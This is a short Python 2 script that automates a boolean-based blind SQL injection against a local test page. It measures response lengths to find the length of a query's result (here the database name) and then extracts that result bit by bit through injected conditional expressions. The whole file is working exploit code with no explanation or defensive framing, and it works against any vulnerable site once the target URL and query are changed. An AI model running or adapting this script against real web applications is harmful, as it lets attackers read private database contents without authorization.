# -*- coding:utf-8 -*-
# Author: k1n9
import urllib2

url = 'http://localhost/test.php?username=root'
payload1 = '%27+and+'
payload2 = 'select+database()'

def getres(url):
	req = urllib2.Request(url)
	return urllib2.urlopen(req)

def getflag(target):
	res = getres(target)
	return len(res.read())

def getlen(target,p1,p2,flag):
	i = 0
	while 1:
		url = target + p1 + 'if(length((' + p2 + '))=' + str(i) + ',1,0)%23'
		res = getres(url)
		print '[*]Data length testing : %d' % i
		if len(res.read()) == flag:
			return i
		i = i + 1

def getdata(target,length,p1,p2,flag):
	data = ''
	bin2 = ''
	for i in range(1,length+1):
		for j in range(1,9):
			url = target + p1 + 'if(mid(lpad(bin(ord(mid(('+ p2 +'),' + str(i) + ',1))),8,0),' + str(j) + ',1)=1,1,0)%23'
			res = getres(url)
			if len(res.read()) == flag:
				bin2 = bin2 + str(1)
			else:
				bin2 = bin2 + str(0)
		data = data + chr(int(bin2,2))
		bin2 = ''
		print data

if __name__ == '__main__':
	flag = getflag(url)
	length = getlen(url,payload1,payload2,flag)
	print '[!]Data len : %d' % length
	getdata(url,length,payload1,payload2,flag)
